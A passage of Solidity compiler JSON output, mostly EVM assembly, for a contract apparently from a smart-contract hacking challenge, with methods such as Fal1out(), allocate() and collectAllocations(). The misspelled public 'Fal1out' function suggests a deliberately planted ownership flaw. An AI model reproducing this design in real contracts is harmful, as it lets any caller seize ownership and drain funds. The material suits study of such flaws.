											"begin": 441,
											"end": 459,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "ADD"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "SWAP1"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "DUP2"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "MSTORE"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "ADD"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 441,
											"end": 459,
											"name": "KECCAK256"
										},
										{
											"begin": 441,
											"end": 471,
											"name": "DUP2"
										},
										{
											"begin": 441,
											"end": 471,
											"name": "SWAP1"
										},
										{
											"begin": 441,
											"end": 471,
											"name": "SSTORE"
										},
										{
											"begin": 441,
											"end": 471,
											"name": "POP"
										},
										{
											"begin": 377,
											"end": 476,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "JUMPDEST"
										},
										{
											"begin": 546,
											"end": 551,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 546,
											"end": 551,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 546,
											"end": 551,
											"name": "SWAP1"
										},
										{
											"begin": 546,
											"end": 551,
											"name": "SLOAD"
										},
										{
											"begin": 546,
											"end": 551,
											"name": "SWAP1"
										},
										{
											"begin": 546,
											"end": 551,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 546,
											"end": 551,
											"name": "EXP"
										},
										{
											"begin": 546,
											"end": 551,
											"name": "SWAP1"
										},
										{
											"begin": 546,
											"end": 551,
											"name": "DIV"
										},
										{
											"begin": 546,
											"end": 551,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 546,
											"end": 551,
											"name": "AND"
										},
										{
											"begin": 532,
											"end": 551,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 532,
											"end": 551,
											"name": "AND"
										},
										{
											"begin": 532,
											"end": 542,
											"name": "CALLER"
										},
										{
											"begin": 532,
											"end": 551,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 532,
											"end": 551,
											"name": "AND"
										},
										{
											"begin": 532,
											"end": 551,
											"name": "EQ"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "JUMPI"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "MLOAD"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "DUP2"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "MSTORE"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "ADD"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "DUP1"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "DUP1"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "ADD"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "DUP3"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "DUP2"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "SUB"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "DUP3"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "MSTORE"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "PUSH",
											"value": "17"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "DUP2"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "MSTORE"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "ADD"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "DUP1"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "PUSH",
											"value": "63616C6C6572206973206E6F7420746865206F776E6572000000000000000000"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "DUP2"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "MSTORE"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "POP"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "ADD"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "SWAP2"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "POP"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "POP"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "MLOAD"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "DUP1"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "SWAP2"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "SUB"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "SWAP1"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "REVERT"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 510,
											"end": 602,
											"name": "JUMPDEST"
										},
										{
											"begin": 949,
											"end": 959,
											"name": "CALLER"
										},
										{
											"begin": 949,
											"end": 968,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 949,
											"end": 968,
											"name": "AND"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "PUSH",
											"value": "8FC"
										},
										{
											"begin": 969,
											"end": 990,
											"name": "SELFBALANCE"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "SWAP1"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "DUP2"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "ISZERO"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "MUL"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "SWAP1"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "MLOAD"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "MLOAD"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "DUP1"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "DUP4"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "SUB"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "DUP2"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "DUP6"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "DUP9"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "DUP9"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "CALL"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "SWAP4"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "POP"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "POP"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "POP"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "POP"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "31"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "31"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 949,
											"end": 991,
											"name": "POP"
										},
										{
											"begin": 896,
											"end": 996,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "JUMPDEST"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "SWAP1"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "SLOAD"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "SWAP1"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "EXP"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "SWAP1"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "DIV"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "AND"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "DUP2"
										},
										{
											"begin": 323,
											"end": 351,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "JUMPDEST"
										},
										{
											"begin": 837,
											"end": 838,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 812,
											"end": 823,
											"name": "DUP1"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 824,
											"end": 833,
											"name": "DUP4"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "AND"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "AND"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "DUP2"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "MSTORE"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "ADD"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "SWAP1"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "DUP2"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "MSTORE"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "ADD"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "KECCAK256"
										},
										{
											"begin": 812,
											"end": 834,
											"name": "SLOAD"
										},
										{
											"begin": 812,
											"end": 838,
											"name": "GT"
										},
										{
											"begin": 804,
											"end": 839,
											"name": "PUSH [tag]",
											"value": "33"
										},
										{
											"begin": 804,
											"end": 839,
											"name": "JUMPI"
										},
										{
											"begin": 804,
											"end": 839,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 804,
											"end": 839,
											"name": "DUP1"
										},
										{
											"begin": 804,
											"end": 839,
											"name": "REVERT"
										},
										{
											"begin": 804,
											"end": 839,
											"name": "tag",
											"value": "33"
										},
										{
											"begin": 804,
											"end": 839,
											"name": "JUMPDEST"
										},
										{
											"begin": 845,
											"end": 854,
											"name": "DUP1"
										},
										{
											"begin": 845,
											"end": 863,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 845,
											"end": 863,
											"name": "AND"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "PUSH",
											"value": "8FC"
										},
										{
											"begin": 864,
											"end": 875,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "DUP1"
										},
										{
											"begin": 876,
											"end": 885,
											"name": "DUP5"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "AND"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "AND"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "DUP2"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "MSTORE"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "ADD"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "SWAP1"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "DUP2"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "MSTORE"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "ADD"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "KECCAK256"
										},
										{
											"begin": 864,
											"end": 886,
											"name": "SLOAD"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "SWAP1"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "DUP2"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "ISZERO"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "MUL"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "SWAP1"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "MLOAD"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "MLOAD"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "DUP1"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "DUP4"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "SUB"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "DUP2"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "DUP6"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "DUP9"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "DUP9"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "CALL"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "SWAP4"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "POP"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "POP"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "POP"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "POP"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 845,
											"end": 887,
											"name": "POP"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "POP"
										},
										{
											"begin": 740,
											"end": 892,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 626,
											"end": 736,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 626,
											"end": 736,
											"name": "JUMPDEST"
										},
										{
											"begin": 693,
											"end": 731,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 721,
											"end": 730,
											"name": "CALLVALUE"
										},
										{
											"begin": 693,
											"end": 704,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "DUP1"
										},
										{
											"begin": 705,
											"end": 715,
											"name": "CALLER"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "AND"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "AND"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "DUP2"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "MSTORE"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "ADD"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "SWAP1"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "DUP2"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "MSTORE"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "ADD"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "KECCAK256"
										},
										{
											"begin": 693,
											"end": 716,
											"name": "SLOAD"
										},
										{
											"begin": 693,
											"end": 720,
											"name": "PUSH [tag]",
											"value": "38"
										},
										{
											"begin": 693,
											"end": 720,
											"name": "SWAP1"
										},
										{
											"begin": 693,
											"end": 731,
											"name": "SWAP2"
										},
										{
											"begin": 693,
											"end": 731,
											"name": "SWAP1"
										},
										{
											"begin": 693,
											"end": 731,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 693,
											"end": 731,
											"name": "AND"
										},
										{
											"begin": 693,
											"end": 731,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 693,
											"end": 731,
											"name": "tag",
											"value": "37"
										},
										{
											"begin": 693,
											"end": 731,
											"name": "JUMPDEST"
										},
										{
											"begin": 667,
											"end": 678,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "DUP1"
										},
										{
											"begin": 679,
											"end": 689,
											"name": "CALLER"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "AND"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "AND"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "DUP2"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "MSTORE"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "ADD"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "SWAP1"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "DUP2"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "MSTORE"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "ADD"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 667,
											"end": 690,
											"name": "KECCAK256"
										},
										{
											"begin": 667,
											"end": 731,
											"name": "DUP2"
										},
										{
											"begin": 667,
											"end": 731,
											"name": "SWAP1"
										},
										{
											"begin": 667,
											"end": 731,
											"name": "SSTORE"
										},
										{
											"begin": 667,
											"end": 731,
											"name": "POP"
										},
										{
											"begin": 626,
											"end": 736,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "JUMPDEST"
										},
										{
											"begin": 1066,
											"end": 1070,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1085,
											"end": 1096,
											"name": "DUP1"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1097,
											"end": 1106,
											"name": "DUP4"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "AND"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "AND"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "DUP2"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "MSTORE"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "ADD"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "SWAP1"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "DUP2"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "MSTORE"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "ADD"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "KECCAK256"
										},
										{
											"begin": 1085,
											"end": 1107,
											"name": "SLOAD"
										},
										{
											"begin": 1078,
											"end": 1107,
											"name": "SWAP1"
										},
										{
											"begin": 1078,
											"end": 1107,
											"name": "POP"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SWAP2"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "SWAP1"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "POP"
										},
										{
											"begin": 1000,
											"end": 1112,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "tag",
											"value": "38"
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "JUMPDEST"
										},
										{
											"begin": 925,
											"end": 932,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 944,
											"end": 953,
											"name": "DUP1"
										},
										{
											"begin": 960,
											"end": 961,
											"name": "DUP3"
										},
										{
											"begin": 956,
											"end": 957,
											"name": "DUP5"
										},
										{
											"begin": 956,
											"end": 961,
											"name": "ADD"
										},
										{
											"begin": 944,
											"end": 961,
											"name": "SWAP1"
										},
										{
											"begin": 944,
											"end": 961,
											"name": "POP"
										},
										{
											"begin": 984,
											"end": 985,
											"name": "DUP4"
										},
										{
											"begin": 979,
											"end": 980,
											"name": "DUP2"
										},
										{
											"begin": 979,
											"end": 985,
											"name": "LT"
										},
										{
											"begin": 979,
											"end": 985,
											"name": "ISZERO"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "JUMPI"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MLOAD"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP2"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MSTORE"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "ADD"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP1"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP1"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "ADD"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP3"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP2"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "SUB"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP3"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MSTORE"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"value": "1B"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP2"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MSTORE"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "ADD"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP1"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"value": "536166654D6174683A206164646974696F6E206F766572666C6F770000000000"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP2"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MSTORE"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "POP"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "ADD"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "SWAP2"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "POP"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "POP"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "MLOAD"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "DUP1"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "SWAP2"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "SUB"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "SWAP1"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "REVERT"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "tag",
											"value": "41"
										},
										{
											"begin": 971,
											"end": 1017,
											"name": "JUMPDEST"
										},
										{
											"begin": 1035,
											"end": 1036,
											"name": "DUP1"
										},
										{
											"begin": 1028,
											"end": 1036,
											"name": "SWAP2"
										},
										{
											"begin": 1028,
											"end": 1036,
											"name": "POP"
										},
										{
											"begin": 1028,
											"end": 1036,
											"name": "POP"
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "SWAP3"
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "SWAP2"
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "POP"
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "POP"
										},
										{
											"begin": 867,
											"end": 1043,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"Fal1out()": "6fab5ddf",
							"allocate()": "abaa9916",
							"allocatorBalance(address)": "ffd40b56",
							"collectAllocations()": "8aa96f38",
							"owner()": "8da5cb5b",
							"sendAllocation(address)": "a2dea26f"
						}
					},
